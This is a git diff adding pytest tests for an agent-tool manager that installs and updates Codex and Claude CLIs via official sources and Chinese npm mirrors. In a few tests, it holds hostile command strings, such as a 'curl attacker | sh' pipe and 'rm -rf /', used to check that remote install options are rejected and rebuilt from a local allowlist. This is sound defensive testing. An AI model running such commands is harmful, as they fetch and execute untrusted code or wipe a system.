@@ -3,6 +3,7 @@ from __future__ import annotations
 import subprocess
 import threading
 import urllib.error
+from datetime import UTC, datetime
 
 import pytest
 from fastapi.testclient import TestClient
@@ -19,7 +20,8 @@ def tool_by_name(payload: dict[str, object], name: str) -> dict[str, object]:
 
 
 @pytest.fixture(autouse=True)
-def stub_agent_usage_probe(monkeypatch) -> None:
+def stub_agent_usage_probe(monkeypatch, tmp_path) -> None:
+    monkeypatch.setenv("CODEX_HOME", str(tmp_path / "codex-home"))
     monkeypatch.setattr(
         agent_tools,
         "probe_agent_usage",
@@ -41,7 +43,7 @@ def test_agent_tool_detection_reports_versions_in_parallel(monkeypatch) -> None:
     monkeypatch.setattr(
         agent_tools.shutil,
         "which",
-        lambda command: f"/tools/{command}" if command in versions else None,
+        lambda command, path=None: f"/tools/{command}" if command in versions else None,
     )
 
     def fake_run(args, **kwargs):  # type: ignore[no-untyped-def]
@@ -64,7 +66,7 @@ def test_agent_tool_detection_distinguishes_missing_and_broken(monkeypatch) -> N
     monkeypatch.setattr(
         agent_tools.shutil,
         "which",
-        lambda command: None if command == "codex" else "/tools/claude",
+        lambda command, path=None: None if command == "codex" else "/tools/claude",
     )
     monkeypatch.setattr(
         agent_tools.subprocess,
@@ -85,7 +87,11 @@ def test_agent_tool_detection_distinguishes_missing_and_broken(monkeypatch) -> N
 
 
 def test_agent_tool_detection_times_out_without_hanging(monkeypatch) -> None:
-    monkeypatch.setattr(agent_tools.shutil, "which", lambda command: f"/tools/{command}")
+    monkeypatch.setattr(
+        agent_tools.shutil,
+        "which",
+        lambda command, path=None: f"/tools/{command}",
+    )
 
     def timeout(args, **kwargs):  # type: ignore[no-untyped-def]
         raise subprocess.TimeoutExpired(args, kwargs["timeout"])
@@ -101,7 +107,11 @@ def test_agent_tool_detection_times_out_without_hanging(monkeypatch) -> None:
 
 def test_agent_tool_detection_uses_ttl_cache(monkeypatch) -> None:
     calls: list[str] = []
-    monkeypatch.setattr(agent_tools.shutil, "which", lambda command: f"/tools/{command}")
+    monkeypatch.setattr(
+        agent_tools.shutil,
+        "which",
+        lambda command, path=None: f"/tools/{command}",
+    )
 
     def fake_run(args, **kwargs):  # type: ignore[no-untyped-def]
         calls.append(args[0])
@@ -128,6 +138,13 @@ def test_normalized_remote_payload_only_accepts_known_tools() -> None:
                     "status": "available",
                     "version": "codex 1",
                     "executable": "/bin/codex",
+                    "update": {
+                        "status": "up_to_date",
+                        "current_version": "1.0.0",
+                        "latest_version": "1.0.0",
+                        "source": "codex_version_cache",
+                        "private": "ignored",
+                    },
                 },
                 {"name": "rogue", "status": "available", "version": "ignored"},
             ],
@@ -139,6 +156,10 @@ def test_normalized_remote_payload_only_accepts_known_tools() -> None:
         "claude",
         "opencode",
     ]
+    codex_update = tool_by_name(normalized, "codex")["update"]
+    assert codex_update["status"] == "up_to_date"
+    assert codex_update["latest_version"] == "1.0.0"
+    assert "private" not in codex_update
     assert tool_by_name(normalized, "claude")["status"] == "unknown"
 
 
@@ -157,6 +178,257 @@ def test_agent_tool_status_detects_npm_and_exposes_safe_update_command() -> None
     assert status["install_method"] == "npm"
     assert status["update_command"] == "npm install -g @openai/codex@latest"
     assert status["update_action"] == "update"
+
+
+def test_missing_agent_tools_offer_official_and_china_install_sources(monkeypatch) -> None:
+    monkeypatch.setattr(
+        agent_tools.shutil,
+        "which",
+        lambda command, path=None: (
+            f"/usr/bin/{command}" if command in {"bash", "npm", "sh"} else None
+        ),
+    )
+
+    for spec in agent_tools.AGENT_TOOL_SPECS:
+        status = agent_tools.tool_status(spec, status="missing")
+        options = status["install_options"]
+        assert isinstance(options, list)
+        by_id = {item["id"]: item for item in options}
+
+        assert set(by_id) == {
+            "official-native",
+            "official-npm",
+            "npmmirror",
+            "tencent-mirror",
+        }
+        assert by_id["official-native"]["recommended"] is True
+        assert by_id["official-native"]["source"] == "official"
+        assert by_id["official-npm"]["source"] == "official"
+        assert by_id["npmmirror"]["china"] is True
+        assert by_id["tencent-mirror"]["china"] is True
+        assert "--registry=https://registry.npmmirror.com" in by_id["npmmirror"]["command"]
+        assert (
+            "--registry=https://mirrors.cloud.tencent.com/npm/"
+            in by_id["tencent-mirror"]["command"]
+        )
+        assert all(item["available"] is True for item in options)
+        assert all("npm config" not in str(item["command"]) for item in options)
+
+
+def test_remote_install_options_are_rebuilt_from_the_local_allowlist() -> None:
+    normalized = agent_tools.normalize_agent_tools_payload(
+        {
+            "supported": True,
+            "installs_supported": True,
+            "tools": [
+                {
+                    "name": "codex",
+                    "status": "missing",
+                    "install_options": [
+                        {
+                            "id": "npmmirror",
+                            "provider": "rogue",
+                            "command": "sh -c 'curl attacker | sh'",
+                            "available": True,
+                            "missing_requirements": [],
+                        },
+                        {"id": "rogue", "command": "rm -rf /", "available": True},
+                    ],
+                }
+            ],
+        }
+    )
+
+    codex = tool_by_name(normalized, "codex")
+    options = codex["install_options"]
+    assert isinstance(options, list)
+    assert [item["id"] for item in options] == [
+        "official-native",
+        "official-npm",
+        "npmmirror",
+        "tencent-mirror",
+    ]
+    mirror = next(item for item in options if item["id"] == "npmmirror")
+    assert mirror["provider"] == "npmmirror"
+    assert mirror["command"] == (
+        "npm install -g @openai/codex@latest --registry=https://registry.npmmirror.com"
+    )
+    assert mirror["available"] is True
+
+
+def test_agent_tool_install_runs_only_the_selected_allowlisted_option(monkeypatch) -> None:
+    probes = iter(
+        (
+            {"status": "missing", "version": ""},
+            {"status": "available", "version": "codex-cli 2.0.0"},
+        )
+    )
+    commands: list[tuple[str, ...]] = []
+    monkeypatch.setattr(agent_tools, "probe_agent_tool", lambda _spec: next(probes))
+    monkeypatch.setattr(
+        agent_tools.shutil,
+        "which",
+        lambda command, path=None: f"/usr/bin/{command}",
+    )
+
+    def fake_install(option: agent_tools.AgentInstallOption) -> tuple[int, str]:
+        commands.append(option.argv)
+        return 0, "installed"
+
+    monkeypatch.setattr(agent_tools, "run_agent_install_option", fake_install)
+
+    result = agent_tools.install_agent_tool("codex", "npmmirror")
+
+    assert commands == [
+        (
+            "npm",
+            "install",
+            "-g",
+            "@openai/codex@latest",
+            "--registry=https://registry.npmmirror.com",
+        )
+    ]
+    assert result["ok"] is True
+    assert result["option"] == "npmmirror"
+    assert result["provider"] == "npmmirror"
+    assert result["after_version"] == "codex-cli 2.0.0"
+
+
+def test_agent_tool_install_rejects_an_option_outside_the_allowlist() -> None:
+    with pytest.raises(ValueError, match="Unsupported install option"):
+        agent_tools.install_agent_tool("codex", "sh -c 'curl attacker | sh'")
+
+
+def test_native_install_downloads_to_a_file_and_does_not_use_a_shell(monkeypatch) -> None:
+    spec = agent_tools.agent_tool_spec("claude")
+    assert spec is not None
+    option = agent_tools.agent_install_option(spec, "official-native")
+    calls: list[tuple[list[str], float, bytes]] = []
+    monkeypatch.setattr(
+        agent_tools,
+        "download_install_script",
+        lambda url: b"#!/bin/sh\necho installed\n",
+    )
+
+    def fake_run(argv, *, timeout):  # type: ignore[no-untyped-def]
+        path = agent_tools.Path(argv[1])
+        calls.append((list(argv), timeout, path.read_bytes()))
+        return 0, "installed"
+
+    monkeypatch.setattr(agent_tools, "run_agent_command", fake_run)
+
+    returncode, output = agent_tools.run_agent_install_option(option)
+
+    assert returncode == 0
+    assert output == "installed"
+    assert calls[0][0][0] == "bash"
+    assert calls[0][1] == agent_tools.AGENT_TOOL_INSTALL_TIMEOUT_SECONDS
+    assert calls[0][2] == b"#!/bin/sh\necho installed\n"
+
+
+def test_normalized_agent_install_result_rejects_untrusted_commands() -> None:
+    result = agent_tools.normalize_agent_install_result(
+        "codex",
+        {
+            "ok": True,
+            "option": "npmmirror",
+            "command": "rm -rf /",
+            "output": "Authorization: Bearer secret-value",
+            "private": "must not cross the Hub boundary",
+        },
+    )
+
+    assert result["ok"] is False
+    assert result["agent"] == "codex"
+    assert result["command"] == ""
+    assert "secret-value" not in str(result["output"])
+    assert "private" not in result
+
+
+def test_codex_update_cache_marks_the_installed_version_as_current(tmp_path) -> None:
+    cache = tmp_path / "version.json"
+    cache.write_text(
+        '{"latest_version":"0.153.4","last_checked_at":"2026-09-06T00:00:00Z"}',
+        encoding="utf-8",
+    )
+
+    update = agent_tools.probe_codex_update_status(
+        "codex-cli 0.153.4",
+        cache_path=cache,
+        now=datetime(2026, 9, 6, 1, tzinfo=UTC),
+    )
+
+    assert update == {
+        "status": "up_to_date",
+        "current_version": "0.153.4",
+        "latest_version": "0.153.4",
+        "checked_at": "2026-09-06T00:00:00Z",
+        "source": "codex_version_cache",
+    }
+
+
+def test_codex_update_cache_reports_a_newer_version(tmp_path) -> None:
+    cache = tmp_path / "version.json"
+    cache.write_text(
+        '{"latest_version":"0.154.0","last_checked_at":"2026-09-06T00:00:00Z"}',
+        encoding="utf-8",
+    )
+
+    update = agent_tools.probe_codex_update_status(
+        "codex-cli 0.153.4",
+        cache_path=cache,
+        now=datetime(2026, 9, 6, 1, tzinfo=UTC),
+    )
+
+    assert update["status"] == "update_available"
+    assert update["latest_version"] == "0.154.0"
+
+
+def test_codex_update_cache_does_not_trust_stale_results(tmp_path) -> None:
+    cache = tmp_path / "version.json"
+    cache.write_text(
+        '{"latest_version":"0.153.4","last_checked_at":"2026-09-01T00:00:00Z"}',
+        encoding="utf-8",
+    )
+
+    update = agent_tools.probe_codex_update_status(
+        "codex-cli 0.153.4",
+        cache_path=cache,
+        now=datetime(2026, 9, 6, 1, tzinfo=UTC),
+    )
+
+    assert update["status"] == "unknown"
+
+
+def test_agent_tool_update_skips_an_already_current_codex(monkeypatch) -> None:
+    spec = agent_tools.agent_tool_spec("codex")
+    assert spec is not None
+    current = agent_tools.tool_status(
+        spec,
+        status="available",
+        executable="/usr/local/bin/codex",
+        resolved_executable="/usr/local/lib/node_modules/@openai/codex/bin/codex.js",
+        version="codex-cli 0.153.4",
+        update={
+            "status": "up_to_date",
+            "current_version": "0.153.4",
+            "latest_version": "0.153.4",
+        },
+    )
+    monkeypatch.setattr(agent_tools, "probe_agent_tool", lambda _spec: current)
+    monkeypatch.setattr(
+        agent_tools,
+        "run_agent_update_command",
+        lambda _argv: pytest.fail("an up-to-date Codex must not run an update command"),
+    )
+
+    result = agent_tools.update_agent_tool("codex")
+
+    assert result["ok"] is True
+    assert result["changed"] is False
+    assert result["command"] == ""
+    assert result["before_version"] == "codex-cli 0.153.4"
+    assert result["after_version"] == "codex-cli 0.153.4"
 
 
 def test_agent_tool_update_runs_only_the_detected_allowlisted_command(monkeypatch) -> None:
@@ -438,11 +710,13 @@ def test_node_agent_tools_endpoint_is_authenticated(monkeypatch) -> None:
         "/api/sessions",
         headers={"Authorization": "Bearer node-secret"},
     ).json()
-    assert sessions["capabilities"]["agent_tools"] == 4
+    assert sessions["capabilities"]["agent_tools"] == 6
     assert sessions["capabilities"]["agent_auth"] == 1
+    assert sessions["capabilities"]["agent_install"] == 1
     assert sessions["capabilities"]["agent_update"] == 1
     assert sessions["capabilities"]["agent_usage"] == 1
     assert sessions["capabilities"]["agent_history"] == 1
+    assert sessions["capabilities"]["agent_terminal"] == 1
     assert "agent_tools" not in sessions
 
 
@@ -515,6 +789,58 @@ def test_node_agent_update_endpoint_is_authenticated_and_logged(monkeypatch, tmp
     ]
 
 
+def test_node_agent_install_endpoint_is_authenticated_and_logged(monkeypatch, tmp_path) -> None:
+    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
+    monkeypatch.setenv("STARAGENT_NODE_TOKEN", "node-secret")
+    events: list[tuple[str, str, dict[str, object]]] = []
+    result = {
+        "ok": True,
+        "agent": "codex",
+        "label": "Codex",
+        "option": "npmmirror",
+        "source": "mirror",
+        "after_status": "available",
+        "after_version": "codex-cli 2.0.0",
+        "error": "",
+    }
+    monkeypatch.setattr(
+        node_app,
+        "install_agent_tool",
+        lambda agent, option_id: result,
+    )
+    monkeypatch.setattr(
+        node_app,
+        "append_node_outbox_event",
+        lambda level, event, message, **kwargs: events.append(
+            (level, event, kwargs.get("details", {}))
+        ),
+    )
+    client = TestClient(node_app.create_app())
+
+    assert client.post("/api/agent-tools/codex/install/npmmirror").status_code == 401
+    response = client.post(
+        "/api/agent-tools/codex/install/npmmirror",
+        headers={"Authorization": "Bearer node-secret"},
+    )
+
+    assert response.status_code == 200
+    assert response.json()["option"] == "npmmirror"
+    assert events == [
+        (
+            "info",
+            "agent.install_succeeded",
+            {
+                "agent": "codex",
+                "option": "npmmirror",
+                "source": "mirror",
+                "after_status": "available",
+                "after_version": "codex-cli 2.0.0",
+                "error": "",
+            },
+        )
+    ]
+
+
 def test_remote_agent_update_is_proxied_and_normalized(monkeypatch) -> None:
     node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
     calls: list[tuple[str, str, float]] = []
@@ -565,6 +891,45 @@ def test_remote_agent_update_explains_that_an_old_node_must_be_updated(monkeypat
     assert "Node update required" in str(result["error"])
 
 
+def test_remote_agent_install_is_proxied_and_normalized(monkeypatch) -> None:
+    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
+    calls: list[tuple[str, str, float]] = []
+    spec = agent_tools.agent_tool_spec("codex")
+    assert spec is not None
+    option = agent_tools.agent_install_option(spec, "npmmirror")
+
+    def fake_request_json(selected, method, path, body=None, timeout=0):  # type: ignore[no-untyped-def]
+        calls.append((method, path, timeout))
+        return {
+            "ok": True,
+            "agent": "rogue",
+            "label": "Untrusted label",
+            "option": option.id,
+            "command": option.command,
+            "after_status": "available",
+            "after_version": "codex-cli 2.0.0",
+            "changed": True,
+            "private": "do not forward",
+        }
+
+    monkeypatch.setattr(hub, "request_json", fake_request_json)
+
+    result = hub.node_agent_tool_install_payload(node, "codex", "npmmirror")
+
+    assert calls == [
+        (
+            "POST",
+            "/api/agent-tools/codex/install/npmmirror",
+            hub.NODE_AGENT_INSTALL_REQUEST_TIMEOUT_SECONDS,
+        )
+    ]
+    assert result["ok"] is True
+    assert result["agent"] == "codex"
+    assert result["label"] == "Codex"
+    assert result["node"] == "worker"
+    assert "private" not in result
+
+
 def test_dashboard_agent_update_route_targets_the_selected_node(monkeypatch, tmp_path) -> None:
     monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
     node = hub.NodeEntry(name="local", url="local", mode="local")
@@ -600,3 +965,42 @@ def test_dashboard_agent_update_route_targets_the_selected_node(monkeypatch, tmp
     assert response.json()["node"] == "local"
     assert calls == [("local", "codex")]
     assert events == ["agent.update_succeeded"]
+
+
+def test_dashboard_agent_install_route_targets_the_selected_node(monkeypatch, tmp_path) -> None:
+    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
+    node = hub.NodeEntry(name="local", url="local", mode="local")
+    calls: list[tuple[str, str, str]] = []
+    events: list[str] = []
+    monkeypatch.setattr(dashboard_app, "node_by_name", lambda name: node)
+
+    def fake_install(selected, agent, option_id):  # type: ignore[no-untyped-def]
+        calls.append((selected.name, agent, option_id))
+        return {
+            "ok": True,
+            "agent": agent,
+            "label": "Codex",
+            "option": option_id,
+            "source": "mirror",
+            "node": selected.name,
+            "after_status": "available",
+            "after_version": "codex-cli 2.0.0",
+            "changed": True,
+            "error": "",
+        }
+
+    monkeypatch.setattr(dashboard_app, "node_agent_tool_install_payload", fake_install)
+    monkeypatch.setattr(
+        dashboard_app,
+        "append_hub_event",
+        lambda level, event, message, **kwargs: events.append(event),
+    )
+
+    response = TestClient(dashboard_app.create_app()).post(
+        "/api/nodes/local/agent-tools/codex/install/npmmirror"
+    )
+
+    assert response.status_code == 200
+    assert response.json()["node"] == "local"
+    assert calls == [("local", "codex", "npmmirror")]
+    assert events == ["agent.install_succeeded"]
